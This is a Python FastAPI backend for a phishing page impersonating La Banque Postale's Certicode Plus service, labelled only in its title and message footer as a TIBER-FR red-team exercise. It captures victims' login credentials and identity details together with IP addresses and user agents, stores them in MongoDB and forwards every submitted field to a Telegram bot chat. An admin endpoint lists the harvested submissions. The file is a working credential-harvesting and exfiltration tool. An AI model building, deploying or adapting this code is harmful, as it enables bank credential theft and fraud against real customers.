from fastapi import FastAPI, APIRouter, Request, HTTPException
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import uuid
import httpx
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import Optional, Dict, Any, List
from datetime import datetime, timezone


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / ".env")

# MongoDB connection
mongo_url = os.environ["MONGO_URL"]
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ["DB_NAME"]]

# Create the main app without a prefix
app = FastAPI(title="Certicode Plus - TIBER-FR Red Team Exercise")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# ---------- Models ----------

class SessionCreate(BaseModel):
    user_agent: Optional[str] = None
    referrer: Optional[str] = None


class SessionOut(BaseModel):
    session_id: str
    created_at: str


class SubmissionIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    step: str  # 'login' | 'card' | 'sms' | 'complete'
    fields: Dict[str, Any] = Field(default_factory=dict)


class SubmissionOut(BaseModel):
    ok: bool
    submission_id: str


# ---------- Helpers ----------

def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _client_meta(request: Request) -> Dict[str, str]:
    fwd = request.headers.get("x-forwarded-for", "")
    ip = fwd.split(",")[0].strip() if fwd else (request.client.host if request.client else "unknown")
    return {
        "ip": ip,
        "user_agent": request.headers.get("user-agent", "unknown"),
    }


def _format_telegram_message(step: str, session_id: str, fields: Dict[str, Any], meta: Dict[str, str]) -> str:
    step_emoji = {
        "login": "🔐",
        "identity": "🪪",
        "complete": "✅",
    }.get(step, "ℹ️")

    step_label = {
        "login": "Connexion (Identifiant + Mot de passe)",
        "identity": "Vérification d'identité",
        "complete": "Parcours terminé",
    }.get(step, step)

    lines = [
        f"<b>{step_emoji} LBP Certicode Plus — {step_label}</b>",
        f"<b>Session</b> : <code>{session_id}</code>",
        f"<b>IP</b> : <code>{meta.get('ip', '?')}</code>",
        f"<b>UA</b> : <code>{meta.get('user_agent', '?')[:180]}</code>",
        f"<b>Heure</b> : {_now_iso()}",
        "—" * 10,
    ]
    for k, v in fields.items():
        safe_v = str(v).replace("<", "&lt;").replace(">", "&gt;")
        lines.append(f"<b>{k}</b> : <code>{safe_v}</code>")
    lines.append("\n<i>Exercice TIBER-FR / DORA — démonstratif</i>")
    return "\n".join(lines)


async def _send_telegram(text: str) -> Dict[str, Any]:
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if not token or not chat_id:
        return {"sent": False, "reason": "telegram_not_configured"}

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    try:
        async with httpx.AsyncClient(timeout=10.0) as http:
            r = await http.post(url, json=payload)
        return {"sent": r.status_code == 200, "status_code": r.status_code, "body": r.text[:200]}
    except Exception as e:
        logging.exception("Telegram send failed")
        return {"sent": False, "reason": str(e)}


# ---------- Routes ----------

@api_router.get("/")
async def root():
    return {"app": "certicode-plus-redteam", "ok": True}


@api_router.get("/health")
async def health():
    telegram_configured = bool(
        os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
        and os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    )
    return {
        "status": "ok",
        "telegram_configured": telegram_configured,
        "time": _now_iso(),
    }


@api_router.post("/sessions", response_model=SessionOut)
async def create_session(payload: SessionCreate, request: Request):
    meta = _client_meta(request)
    session_id = str(uuid.uuid4())
    doc = {
        "session_id": session_id,
        "created_at": _now_iso(),
        "ip": meta["ip"],
        "user_agent": meta["user_agent"],
        "referrer": payload.referrer or request.headers.get("referer", ""),
        "steps": [],
    }
    await db.sessions.insert_one(doc)
    return SessionOut(session_id=session_id, created_at=doc["created_at"])


@api_router.post("/submissions", response_model=SubmissionOut)
async def create_submission(payload: SubmissionIn, request: Request):
    meta = _client_meta(request)
    submission_id = str(uuid.uuid4())

    sub_doc = {
        "submission_id": submission_id,
        "session_id": payload.session_id,
        "step": payload.step,
        "fields": payload.fields,
        "ip": meta["ip"],
        "user_agent": meta["user_agent"],
        "created_at": _now_iso(),
    }
    await db.submissions.insert_one(sub_doc)

    # Update session to include this step
    await db.sessions.update_one(
        {"session_id": payload.session_id},
        {"$push": {"steps": {"step": payload.step, "submission_id": submission_id, "at": sub_doc["created_at"]}}},
    )

    # Forward to Telegram (non-blocking style but we await for status)
    text = _format_telegram_message(payload.step, payload.session_id, payload.fields, meta)
    tg = await _send_telegram(text)
    logging.info(f"Telegram forward result: {tg}")

    return SubmissionOut(ok=True, submission_id=submission_id)


@api_router.get("/admin/submissions")
async def list_submissions(token: str):
    # Lightweight read endpoint protected by env-token. Useful only for debugging.
    expected = os.environ.get("ADMIN_READ_TOKEN", "").strip()
    if not expected or token != expected:
        raise HTTPException(status_code=403, detail="forbidden")
    rows = await db.submissions.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return {"count": len(rows), "items": rows}


# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get("CORS_ORIGINS", "*").split(","),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
